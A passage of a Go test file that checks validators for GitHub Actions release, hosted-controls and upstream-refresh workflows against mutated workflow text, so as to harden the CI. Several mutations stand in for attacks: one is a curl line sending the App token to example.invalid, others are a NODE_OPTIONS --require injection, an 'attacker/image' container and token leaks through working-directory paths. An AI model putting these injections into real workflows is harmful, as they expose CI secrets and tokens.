		{"publish replaces the script before running it", "      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "      - run: echo x > scripts/ci/upstream-refresh-publish.sh\n      - shell: bash --noprofile --norc -euo pipefail {0}\n        env:", "must not run other steps before the publish script"},
		{"publish step reads the whole steps context", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - env:\n          T: ${{ toJSON(STEPS) }}\n        run: echo\n", "App token only in the publish script step"},
		{"scope-guard runs in a container", "    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "    container: attacker/image\n    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout", "must run on ubuntu-latest and must not run in a container"},
		{"publish runs on a self-hosted runner", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: self-hosted\n", "must run on ubuntu-latest"},
		{"scope-guard step moves its working directory", "      - id: guard\n", "      - id: guard\n        working-directory: attacker\n", "scope-guard job must run the scope guard as its only run step"},
		{"publisher moves its working directory", "        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "        working-directory: attacker\n        env:\n          GH_TOKEN: ${{ steps.app-token.outputs.token }}\n", "must run only the publish script"},
		{"workflow default working directory", "env:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "defaults:\n  run:\n    working-directory: attacker\nenv:\n  WORKCELL_COSIGN_VERSION: v3.0.6\n", "not inherit workflow or job env"},
		{"publish job defaults", "  publish:\n    runs-on: ubuntu-latest\n", "  publish:\n    runs-on: ubuntu-latest\n    defaults:\n      run:\n        working-directory: attacker\n", "not inherit workflow or job env"},
		{"post-publish step sends the token from its shell", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - shell: curl -d ${{ steps.app-token.outputs.token }} https://example.invalid; bash {0}\n        run: \"true\"\n", "App token only in the publish script step"},
		{"post-publish step puts the token in its working directory", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n", "          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md\n      - working-directory: /tmp/${{ steps.app-token.outputs.token }}\n        run: echo \"${PWD}\"\n", "App token only in the publish script step"},
		{"mint step injects NODE_OPTIONS", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n", "      - id: app-token\n        uses: actions/create-github-app-token@bcd2ba49218906704ab6c1aa796996da409d3eb1 # v3\n        env:\n          NODE_OPTIONS: --require ./wrapper.js\n", "must mint the App token"},
		{"presence step uses a wrapper shell", "      - id: app-token\n", "      - id: secrets\n        shell: ./wrap {0}\n        env:\n          APP_CLIENT_ID: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID }}\n          APP_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY }}\n        run: |\n          if [[ -z \"${APP_CLIENT_ID}\" || -z \"${APP_PRIVATE_KEY}\" ]]; then\n            echo \"present=false\" >> \"${GITHUB_OUTPUT}\"\n            echo \"::notice::The upstream-refresh App credentials are not configured. Publication is skipped. See docs/github-workflows.md.\"\n            exit 0\n          fi\n          echo \"present=true\" >> \"${GITHUB_OUTPUT}\"\n      - id: app-token\n", "App token only in the publish script step"},
		{"publish hard-codes the guard result", "candidate \"${SCOPE_GUARD_RESULT}\" audit.md", "candidate passed audit.md", "second publish script argument"},
		{"publish ignores scope-guard result", "SCOPE_GUARD_RESULT: ${{ needs.scope-guard.outputs.result }}", "SCOPE_GUARD_RESULT: passed", "must pass the scope-guard result"},
		{"publish App token extra permission", "          permission-pull-requests: write\n", "          permission-pull-requests: write\n          permission-workflows: write\n", "only contents and pull-requests write"},
		{"publish App token renamed step", "      - id: app-token\n", "      - id: token\n", "as step app-token"},
		{"publish with a PAT", "GH_TOKEN: ${{ steps.app-token.outputs.token }}", "GH_TOKEN: ${{ secrets.OTHER_PAT }}", "must pass the App token as GH_TOKEN"},
		{"toolchain refresh drops --toolchain-only", "./scripts/update-upstream-pins.sh --apply --toolchain-only | tee apply.log", "./scripts/update-upstream-pins.sh --apply | tee apply.log", "only with --toolchain-only"},
		{"second full refresh in the provider step", "          ./scripts/ci/upstream-refresh-candidate.sh provider", "          ./scripts/update-upstream-pins.sh --apply\n          ./scripts/ci/upstream-refresh-candidate.sh provider", "only with --toolchain-only"},
		{"toolchain refresh runs twice", "          ./scripts/ci/upstream-refresh-candidate.sh toolchain", "          ./scripts/update-upstream-pins.sh --apply --toolchain-only\n          ./scripts/ci/upstream-refresh-candidate.sh toolchain", "--apply --toolchain-only once"},
		{"provider updater runs apply and check in one call", "update-provider-pins.sh --apply | tee provider.log\n          WORKCELL_GITHUB_API_TOKEN_FILE=\"${token_file}\" ./scripts/update-provider-pins.sh --check\n", "update-provider-pins.sh --apply --check | tee provider.log\n", "each updater --apply and --check once"},
		{"provider step is skipped", "if: steps.existing_pr.outputs.provider == ''", "if: false", "must run only when"},
		{"toolchain step gains a false condition", "if: steps.existing_pr.outputs.toolchain == ''", "if: steps.existing_pr.outputs.toolchain == '' && false", "must run only when"},
		{"hosted signing input", "      - env:\n          GH_TOKEN: ${{ github.token }}\n        run: |\n          gh issue create", "      - env:\n          WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY: ${{ secrets.WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY }}\n        run: |\n          gh issue create", "WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY"},
	}
	for _, mutation := range mutations {
		t.Run(mutation.name, func(t *testing.T) {
			old := strings.ReplaceAll(mutation.old, `\n`, "\n")
			if !strings.Contains(upstreamRefreshWorkflowFixture, old) {
				t.Fatalf("fixture does not contain %q", old)
			}
			mutated := strings.Replace(upstreamRefreshWorkflowFixture, old, strings.ReplaceAll(mutation.replacement, `\n`, "\n"), 1)
			err := metadatautil.ValidateUpstreamRefreshWorkflow(mutated)
			if err == nil || !strings.Contains(err.Error(), mutation.want) {
				t.Fatalf("metadatautil.ValidateUpstreamRefreshWorkflow() error = %v, want %q", err, mutation.want)
			}
		})
	}
}

// TestValidateUpstreamRefreshWorkflowRejectsEvasions runs the shared evasion
// corpus against the publish command in the canonical workflow. A comment,
// heredoc body or longer name must not satisfy it. The scope-guard step needs
// no corpus run: the validator requires its exact run text.
func TestValidateUpstreamRefreshWorkflowRejectsEvasions(t *testing.T) {
	t.Parallel()
	RequireRejectsAllEvasions(t, upstreamRefreshWorkflowFixture,
		"          ./scripts/ci/upstream-refresh-publish.sh candidate \"${SCOPE_GUARD_RESULT}\" audit.md",
		"run the publish script once", metadatautil.ValidateUpstreamRefreshWorkflow)
	const tokenFile = "          WORKCELL_GITHUB_API_TOKEN_FILE=\"${token_file}\" "
	RequireRejectsAllEvasions(t, upstreamRefreshWorkflowFixture,
		tokenFile+"./scripts/update-upstream-pins.sh --apply --toolchain-only | tee apply.log",
		"--apply --toolchain-only once", metadatautil.ValidateUpstreamRefreshWorkflow)
	for _, anchor := range []string{
		"./scripts/update-upstream-pins.sh --check --toolchain-only",
		"./scripts/update-provider-pins.sh --apply | tee provider.log",
		"./scripts/update-provider-pins.sh --check",
	} {
		RequireRejectsAllEvasions(t, upstreamRefreshWorkflowFixture, tokenFile+anchor,
			"build the provider and toolchain candidates once each", metadatautil.ValidateUpstreamRefreshWorkflow)
	}
	for _, kind := range []string{"provider", "toolchain"} {
		RequireRejectsAllEvasions(t, upstreamRefreshWorkflowFixture,
			"          ./scripts/ci/upstream-refresh-candidate.sh "+kind+" \"${RUNNER_TEMP}/upstream-refresh-candidate\"",
			"build the provider and toolchain candidates once each", metadatautil.ValidateUpstreamRefreshWorkflow)
	}
}

func TestValidateHostedControlsWorkflowRequiresMainRef(t *testing.T) {
	t.Parallel()
	workflow := `name: Hosted controls

on:
  workflow_dispatch:

jobs:
  verify-hosted-controls:
    if: github.ref == 'refs/heads/main'
    environment:
      name: hosted-controls-audit
    steps:
      - name: Verify GitHub-hosted controls
        env:
          WORKCELL_HOSTED_CONTROLS_REQUIRED: "1"
          WORKCELL_HOSTED_CONTROLS_TOKEN: ${{ secrets.WORKCELL_HOSTED_CONTROLS_TOKEN }}
        run: ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"
`

	if err := metadatautil.ValidateHostedControlsWorkflow(workflow); err != nil {
		t.Fatalf("metadatautil.ValidateHostedControlsWorkflow() error = %v", err)
	}
	assertManualWorkflowMainRefGuard(t, workflow, metadatautil.ValidateHostedControlsWorkflow)
}

func TestValidateHostedControlsWorkflowRejectsAmbiguousJobMappings(t *testing.T) {
	t.Parallel()
	const workflow = `name: Hosted controls
jobs:
  verify-hosted-controls:
    if: github.ref == 'refs/heads/main'
    environment:
      name: hosted-controls-audit
    steps:
      - env:
          WORKCELL_HOSTED_CONTROLS_REQUIRED: "1"
          WORKCELL_HOSTED_CONTROLS_TOKEN: ${{ secrets.WORKCELL_HOSTED_CONTROLS_TOKEN }}
        run: ./scripts/run-hosted-controls-audit.sh "${GITHUB_REPOSITORY}"
`
	mutations := []struct {
		name        string
		old         string
		replacement string
	}{
		{name: "duplicate jobs", old: "jobs:\n", replacement: "jobs: {}\njobs:\n"},
		{name: "duplicate target job", old: "  verify-hosted-controls:\n", replacement: "  verify-hosted-controls: {}\n  verify-hosted-controls:\n"},
		{name: "target job is not a mapping", old: "  verify-hosted-controls:\n", replacement: "  verify-hosted-controls: true\n  unrelated:\n"},
	}
	for _, mutation := range mutations {
		t.Run(mutation.name, func(t *testing.T) {
			mutated := strings.Replace(workflow, mutation.old, mutation.replacement, 1)
			if err := metadatautil.ValidateHostedControlsWorkflow(mutated); err == nil {
				t.Fatal("metadatautil.ValidateHostedControlsWorkflow() unexpectedly succeeded")
			}
		})
	}
}

func assertManualWorkflowMainRefGuard(t *testing.T, workflow string, validate func(string) error) {
	t.Helper()
	const guard = "    if: github.ref == 'refs/heads/main'"
	mutations := []struct {
		name        string
		replacement string
	}{
		{name: "missing", replacement: ""},
		{name: "wrong ref", replacement: "    if: github.ref == 'refs/heads/release'"},
		{name: "fail open", replacement: "    if: always()"},
		{name: "duplicate", replacement: guard + "\n" + guard},
		{name: "boolean", replacement: "    if: true"},
		{name: "mapping", replacement: "    if: {ref: main}"},
		{name: "sibling text", replacement: "    note: \"github.ref == 'refs/heads/main'\""},
	}
	for _, mutation := range mutations {
		t.Run(mutation.name, func(t *testing.T) {
			mutated := strings.Replace(workflow, guard, mutation.replacement, 1)
			if err := validate(mutated); err == nil || !strings.Contains(err.Error(), guard[8:]) {
				t.Fatalf("validator error = %v, want main-ref guard rejection", err)
			}
		})
	}
}

func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsLegacySupportVariables(t *testing.T) {
	t.Parallel()
	releaseWorkflow := `env:
  RELEASE_NO_ATTEST: ${{ vars.WORKCELL_RELEASE_NO_ATTEST || 'false' }}
  ENABLE_GITHUB_ATTESTATIONS_SUPPORTED: ${{ !github.event.repository.private || github.event.repository.owner.type != 'User' }}

jobs:
  sign-release:
    steps:
      - uses: actions/attest@59d89421af93a897026c735860bf21b6eb4f7b26 # v4.1.0
        if: env.RELEASE_NO_ATTEST != 'true'
`

	err := metadatautil.ValidateReleaseWorkflowGitHubAttestationFlow(releaseWorkflow)
	if err == nil {
		t.Fatal("metadatautil.ValidateReleaseWorkflowGitHubAttestationFlow() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "must not use mutable repository variables") {
		t.Fatalf("metadatautil.ValidateReleaseWorkflowGitHubAttestationFlow() error = %v, want support guard failure", err)
	}
}

func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsMutableDecisionVariables(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	for _, tc := range []struct {
		name        string
		old         string
		replacement string
	}{
		{
			name:        "attestation opt-out",
			old:         "env:\n",
			replacement: "env:\n  RELEASE_NO_ATTEST: ${{ vars.WORKCELL_RELEASE_NO_ATTEST || 'false' }}\n",
		},
		{
			name:        "private capability flag",
			old:         "env:\n",
			replacement: "env:\n  WORKCELL_ENABLE_PRIVATE_GITHUB_ATTESTATIONS: ${{ vars.WORKCELL_ENABLE_PRIVATE_GITHUB_ATTESTATIONS }}\n",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mutated := strings.Replace(workflow, tc.old, tc.replacement, 1)
			if mutated == workflow {
				t.Fatalf("release workflow does not contain %q", tc.old)
			}
			requireReleaseAttestationError(t, mutated, "must not use mutable repository variables")
		})
	}
}

func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsConditionalAttestStep(t *testing.T) {
	t.Parallel()
	releaseWorkflow := `jobs:
  release:
    steps:
      - name: Confirm attestation environment policy
        env:
          REPOSITORY_VISIBILITY: ${{ github.event.repository.visibility }}
        run: |
          if [[ "${REPOSITORY_VISIBILITY}" != "public" ]]; then
            echo "::error::Release requires GitHub attestations but they are not supported for this repository." >&2
            echo "::error::Publish the repository, or review a fork-specific workflow and hosted-control policy change." >&2
            exit 1
          fi
  sign-release:
    needs:
      - release
    steps:
      - uses: actions/attest@59d89421af93a897026c735860bf21b6eb4f7b26 # v4.1.0
        if: github.event.repository.visibility == 'public'
        with:
          subject-name: ${{ env.IMAGE_NAME }}
`

	requireReleaseAttestationError(t, releaseWorkflow, "without a mutable condition")
}

func TestValidateReleaseWorkflowGitHubAttestationFlowAcceptsSupportGuard(t *testing.T) {
	t.Parallel()
	if err := metadatautil.ValidateReleaseWorkflowGitHubAttestationFlow(string(readReleaseWorkflow(t))); err != nil {
		t.Fatalf("metadatautil.ValidateReleaseWorkflowGitHubAttestationFlow() error = %v", err)
	}
}

func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsInvalidVisibilityBinding(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	for _, tc := range []struct {
		name        string
		old         string
		replacement string
		want        string
	}{
		{
			name:        "mutable repository variable",
			old:         "REPOSITORY_VISIBILITY: ${{ github.event.repository.visibility }}",
			replacement: "REPOSITORY_VISIBILITY: ${{ vars.REPOSITORY_VISIBILITY }}",
			want:        "must bind repository visibility from the GitHub event",
		},
		{
			name:        "undefined runner variable",
			old:         `if [[ "${REPOSITORY_VISIBILITY}" != "public" ]]; then`,
			replacement: `if [[ "${GITHUB_REPOSITORY_VISIBILITY}" != "public" ]]; then`,
			want:        "must use the exact fail-closed public repository visibility check",
		},
		{
			name:        "guard made conditional",
			old:         "      - name: Confirm attestation environment policy\n",
			replacement: "      - name: Confirm attestation environment policy\n        if: github.event.repository.visibility == 'public'\n",
			want:        "must run the attestation environment policy step unconditionally",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mutated := strings.Replace(workflow, tc.old, tc.replacement, 1)
			if mutated == workflow {
				t.Fatalf("release workflow does not contain %q", tc.old)
			}
			requireReleaseAttestationError(t, mutated, tc.want)
		})
	}
}

// TestValidateReleaseWorkflowGitHubAttestationFlowRejectsGuardOutsideReleaseJob
// moves the guard into an earlier job. The release artifact job is the one job
// every attestation subject is built in, so a guard anywhere else can be
// reordered away from what it protects without this validator noticing.
func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsGuardOutsideReleaseJob(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	mutated := strings.Replace(workflow,
		"      - name: Confirm attestation environment policy\n",
		"      - name: Attestation environment policy moved out of release\n", 1)
	mutated = strings.Replace(mutated,
		"      - name: Classify release tag\n",
		`      - name: Confirm attestation environment policy
        env:
          REPOSITORY_VISIBILITY: ${{ github.event.repository.visibility }}
        run: |
          if [[ "${REPOSITORY_VISIBILITY}" != "public" ]]; then
            echo "::error::Release requires GitHub attestations but they are not supported for this repository." >&2
            echo "::error::Publish the repository, or review a fork-specific workflow and hosted-control policy change." >&2
            exit 1
          fi

      - name: Classify release tag
`, 1)
	if mutated == workflow {
		t.Fatal("release workflow guard mutation did not change the fixture")
	}
	requireReleaseAttestationError(t, mutated, "release artifact job must contain exactly one attestation environment policy step")
}

// TestValidateReleaseWorkflowGitHubAttestationFlowRejectsUnguardedSigner drops
// the dependency edge that puts the guard ahead of the attestations. The guard
// runs in the release artifact job and the attestations run in sign-release, so
// that edge is the only thing ordering one before the other.
func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsUnguardedSigner(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	mutated := strings.Replace(workflow, "      - preflight-arm64-repro\n      - release\n", "      - preflight-arm64-repro\n", 1)
	if mutated == workflow {
		t.Fatal("sign-release no longer declares the release artifact job in the needs list this test removes")
	}
	requireReleaseAttestationError(t, mutated, "must check attestation support before its first attestation step")
}

// TestValidateReleaseWorkflowGitHubAttestationFlowRejectsAttestationOutsideSigner
// moves an attestation into an unprivileged job. Only sign-release holds the
// attestations: write permission, so an attest step elsewhere is either a
// permission the reviewer did not intend or an attestation that silently fails.
func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsAttestationOutsideSigner(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	mutated := strings.Replace(workflow,
		"      - name: Classify release tag\n",
		"      - uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2\n        with:\n          subject-path: dist/SHA256SUMS\n\n      - name: Classify release tag\n", 1)
	if mutated == workflow {
		t.Fatal("release workflow does not contain the tag classification step this test extends")
	}
	requireReleaseAttestationError(t, mutated, `found one in "tag-policy"`)
}

func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsConditionalVerifierCalls(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	for _, stepName := range []string{
		"Verify release outputs",
		"Re-verify sealed release outputs before publication",
	} {
		t.Run(stepName, func(t *testing.T) {
			old := "      - name: " + stepName + "\n"
			mutated := strings.Replace(workflow, old, old+"        if: github.event.repository.visibility == 'public'\n", 1)
			if mutated == workflow {
				t.Fatalf("release workflow does not contain %q", stepName)
			}
			requireReleaseAttestationError(t, mutated, "must run release-output attestation verification unconditionally")
		})
	}
}

func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsMissingVerifierAttestations(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	const requiredLine = "            --attestations\n"
	first := strings.Index(workflow, requiredLine)
	last := strings.LastIndex(workflow, requiredLine)
	if first < 0 || last <= first {
		t.Fatal("release workflow must contain two attestation verifier arguments")
	}
	for _, tc := range []struct {
		name  string
		index int
		want  string
	}{
		{name: "independent verifier", index: first, want: "verify-release-outputs job"},
		{name: "pre-publication verifier", index: last, want: "publish-github-release job"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			mutated := workflow[:tc.index] + workflow[tc.index+len(requiredLine):]
			requireReleaseAttestationError(t, mutated, tc.want)
		})
	}
}

func TestValidateReleaseWorkflowGitHubAttestationFlowRejectsDuplicateYAMLKeys(t *testing.T) {
	t.Parallel()
	workflow := string(readReleaseWorkflow(t))
	const jobName = "    name: Release reproducible image (amd64)\n"
	mutated := strings.Replace(workflow, jobName, jobName+jobName, 1)
	if mutated == workflow {
		t.Fatal("release workflow does not contain the amd64 job name")
	}
	requireReleaseAttestationError(t, mutated, "parse release attestation flow")
}

func requireReleaseAttestationError(t *testing.T, workflow, want string) {
	t.Helper()
	err := metadatautil.ValidateReleaseWorkflowGitHubAttestationFlow(workflow)
	if err == nil || !strings.Contains(err.Error(), want) {
		t.Fatalf("metadatautil.ValidateReleaseWorkflowGitHubAttestationFlow() error = %v, want %q", err, want)
	}
}

func TestValidateCanonicalHostedControlsRepositoryVariablesRejectsMissingPrivateAttestationFlag(t *testing.T) {
	t.Parallel()
	policy := map[string]any{
		"repository_variables": map[string]any{
			"WORKCELL_RELEASE_NO_ATTEST": "false",
		},
	}

	err := metadatautil.ValidateCanonicalRepositoryVariables(policy, "policy/github-hosted-controls.toml")
	if err == nil {
		t.Fatal("metadatautil.ValidateCanonicalRepositoryVariables() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "WORKCELL_ENABLE_PRIVATE_GITHUB_ATTESTATIONS") {
		t.Fatalf("metadatautil.ValidateCanonicalRepositoryVariables() error = %v, want missing private attestation flag", err)
	}
}

func TestValidateCanonicalHostedControlsRepositoryVariablesRejectsWrongPrivateAttestationFlag(t *testing.T) {
	t.Parallel()
	policy := map[string]any{
		"repository_variables": map[string]any{
			"WORKCELL_RELEASE_NO_ATTEST":                  "false",
			"WORKCELL_ENABLE_PRIVATE_GITHUB_ATTESTATIONS": "true",
		},
	}

	err := metadatautil.ValidateCanonicalRepositoryVariables(policy, "policy/github-hosted-controls.toml")
	if err == nil {
		t.Fatal("metadatautil.ValidateCanonicalRepositoryVariables() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), `WORKCELL_ENABLE_PRIVATE_GITHUB_ATTESTATIONS = "false"`) {
		t.Fatalf("metadatautil.ValidateCanonicalRepositoryVariables() error = %v, want private attestation value failure", err)
	}
}

func TestValidateCanonicalHostedControlsRepositoryVariablesAcceptsCanonicalValues(t *testing.T) {
	t.Parallel()
	policy := map[string]any{
		"repository_variables": map[string]any{
			"WORKCELL_RELEASE_NO_ATTEST":                  "false",
			"WORKCELL_ENABLE_PRIVATE_GITHUB_ATTESTATIONS": "false",
		},
	}

	if err := metadatautil.ValidateCanonicalRepositoryVariables(policy, "policy/github-hosted-controls.toml"); err != nil {
		t.Fatalf("metadatautil.ValidateCanonicalRepositoryVariables() error = %v", err)
	}
}

func TestValidateCanonicalHostedControlsWorkflowEnvironmentsRejectsMissingHostedControlsAudit(t *testing.T) {
	t.Parallel()
	policy := map[string]any{
		"workflow_environment": map[string]any{
			"release": map[string]any{
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
			},
			"upstream-refresh": map[string]any{
				"required_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID", "WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY"},
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
			},
		},
	}

	err := metadatautil.ValidateCanonicalWorkflowEnvironments(policy, "policy/github-hosted-controls.toml")
	if err == nil {
		t.Fatal("metadatautil.ValidateCanonicalWorkflowEnvironments() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "workflow_environment.hosted-controls-audit") {
		t.Fatalf("metadatautil.ValidateCanonicalWorkflowEnvironments() error = %v, want hosted-controls-audit rejection", err)
	}
}

func TestValidateCanonicalHostedControlsWorkflowEnvironmentsRejectsInvalidReleasePolicy(t *testing.T) {
	t.Parallel()
	tests := []struct {
		name    string
		release map[string]any
		want    string
	}{
		{
			name:    "missing admin bypass",
			release: map[string]any{"deployment_branches": []any{"main"}},
			want:    "must set workflow_environment.release.allow_admin_bypass = false",
		},
		{
			name:    "admin bypass enabled",
			release: map[string]any{"allow_admin_bypass": true, "deployment_branches": []any{"main"}},
			want:    "must set workflow_environment.release.allow_admin_bypass = false",
		},
		{
			name:    "unexpected secrets",
			release: map[string]any{"required_secrets": []any{"RELEASE_TOKEN"}, "allow_admin_bypass": false, "deployment_branches": []any{"main"}},
			want:    "must not declare secrets for workflow_environment.release",
		},
		{
			name:    "unexpected optional secrets",
			release: map[string]any{"optional_secrets": []any{"RELEASE_TOKEN"}, "allow_admin_bypass": false, "deployment_branches": []any{"main"}},
			want:    "must not declare optional secrets for workflow_environment.release",
		},
		{
			name:    "unexpected variables",
			release: map[string]any{"variables": map[string]any{"RELEASE_REGION": "north"}, "allow_admin_bypass": false, "deployment_branches": []any{"main"}},
			want:    "must not declare public variables for workflow_environment.release",
		},
		{
			name:    "deployment tags",
			release: map[string]any{"allow_admin_bypass": false, "deployment_branches": []any{"main"}, "deployment_tags": []any{"v*"}},
			want:    "must not set workflow_environment.release.deployment_tags",
		},
		{
			name:    "missing deployment branches",
			release: map[string]any{"allow_admin_bypass": false},
			want:    "must set workflow_environment.release.deployment_branches = [\"main\"]",
		},
		{
			name:    "wrong deployment branch",
			release: map[string]any{"allow_admin_bypass": false, "deployment_branches": []any{"release"}},
			want:    "must set workflow_environment.release.deployment_branches = [\"main\"]",
		},
		{
			name:    "multiple deployment branches",
			release: map[string]any{"allow_admin_bypass": false, "deployment_branches": []any{"main", "release"}},
			want:    "must set workflow_environment.release.deployment_branches = [\"main\"]",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			policy := map[string]any{
				"workflow_environment": map[string]any{
					"release": tt.release,
					"hosted-controls-audit": map[string]any{
						"required_secrets":    []any{"WORKCELL_HOSTED_CONTROLS_TOKEN"},
						"allow_admin_bypass":  false,
						"deployment_branches": []any{"main"},
						"deployment_tags":     []any{"v*"},
					},
					"upstream-refresh": map[string]any{
						"required_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID", "WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY"},
						"allow_admin_bypass":  false,
						"deployment_branches": []any{"main"},
					},
				},
			}

			err := metadatautil.ValidateCanonicalWorkflowEnvironments(policy, "policy/github-hosted-controls.toml")
			if err == nil {
				t.Fatal("metadatautil.ValidateCanonicalWorkflowEnvironments() unexpectedly accepted invalid release policy")
			}
			if !strings.Contains(err.Error(), tt.want) {
				t.Fatalf("metadatautil.ValidateCanonicalWorkflowEnvironments() error = %v, want %q", err, tt.want)
			}
		})
	}
}

func TestValidateCanonicalHostedControlsWorkflowEnvironmentsRejectsUnexpectedUpstreamRefreshSecrets(t *testing.T) {
	t.Parallel()
	policy := map[string]any{
		"workflow_environment": map[string]any{
			"release": map[string]any{
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
			},
			"hosted-controls-audit": map[string]any{
				"required_secrets":    []any{"WORKCELL_HOSTED_CONTROLS_TOKEN"},
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
				"deployment_tags":     []any{"v*"},
			},
			"upstream-refresh": map[string]any{
				"required_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID", "WORKCELL_UPSTREAM_REFRESH_GPG_PRIVATE_KEY"},
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
			},
		},
	}

	err := metadatautil.ValidateCanonicalWorkflowEnvironments(policy, "policy/github-hosted-controls.toml")
	if err == nil {
		t.Fatal("metadatautil.ValidateCanonicalWorkflowEnvironments() unexpectedly succeeded")
	}
	if !strings.Contains(err.Error(), "must not require secrets") {
		t.Fatalf("metadatautil.ValidateCanonicalWorkflowEnvironments() error = %v, want upstream-refresh secret rejection", err)
	}
}

func TestValidateCanonicalHostedControlsWorkflowEnvironmentsAcceptsCanonicalValues(t *testing.T) {
	t.Parallel()
	policy := map[string]any{
		"workflow_environment": map[string]any{
			"release": map[string]any{
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
			},
			"hosted-controls-audit": map[string]any{
				"required_secrets":    []any{"WORKCELL_HOSTED_CONTROLS_TOKEN"},
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
				"deployment_tags":     []any{"v*"},
			},
			"upstream-refresh": map[string]any{
				"optional_secrets":    []any{"WORKCELL_UPSTREAM_REFRESH_APP_CLIENT_ID", "WORKCELL_UPSTREAM_REFRESH_APP_PRIVATE_KEY"},
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
			},
		},
	}

	if err := metadatautil.ValidateCanonicalWorkflowEnvironments(policy, "policy/github-hosted-controls.toml"); err != nil {
		t.Fatalf("metadatautil.ValidateCanonicalWorkflowEnvironments() error = %v", err)
	}
}

func TestHostedControlsEnvironmentArtifactNameEscapesSlashes(t *testing.T) {
	t.Parallel()

	if got := metadatautil.EnvironmentArtifactName("prod/us west"); got != "prod%2Fus%20west" {
		t.Fatalf("metadatautil.EnvironmentArtifactName() = %q, want %q", got, "prod%2Fus%20west")
	}
}

func TestHostedControlsEnvironmentArtifactNameEscapesReservedCharacters(t *testing.T) {
	t.Parallel()

	if got := metadatautil.EnvironmentArtifactName("prod+east:blue&green=1"); got != "prod%2Beast%3Ablue%26green%3D1" {
		t.Fatalf("metadatautil.EnvironmentArtifactName() = %q, want %q", got, "prod%2Beast%3Ablue%26green%3D1")
	}
}

func TestValidateCanonicalWorkflowEnvironmentsRejectsAuditOptionalSecrets(t *testing.T) {
	t.Parallel()
	policy := map[string]any{
		"workflow_environment": map[string]any{
			"release": map[string]any{"allow_admin_bypass": false, "deployment_branches": []any{"main"}},
			"hosted-controls-audit": map[string]any{
				"required_secrets":    []any{"WORKCELL_HOSTED_CONTROLS_TOKEN"},
				"optional_secrets":    []any{"EXTRA"},
				"allow_admin_bypass":  false,
				"deployment_branches": []any{"main"},
				"deployment_tags":     []any{"v*"},
			},
		},
	}
	err := metadatautil.ValidateCanonicalWorkflowEnvironments(policy, "policy/github-hosted-controls.toml")
	if err == nil || !strings.Contains(err.Error(), "must not declare optional secrets for workflow_environment.hosted-controls-audit") {
		t.Fatalf("error = %v, want optional-secret rejection", err)
	}
}

// TestWorkflowValidatorsRejectUnmodelledKeysAndJobConditions is the negative
// control for the closed workflow decoder: an unmodelled key fails, and a job
// condition that could skip a checked job fails, in every validator that reads
// the job.
func TestWorkflowValidatorsRejectUnmodelledKeysAndJobConditions(t *testing.T) {
	release := string(readReleaseWorkflow(t))
	const onCandidate = "    if: github.ref == 'refs/heads/main' && needs.refresh.outputs.candidate == 'true'\n"
	cases := []struct {
		name, workflow, old, replacement, want string
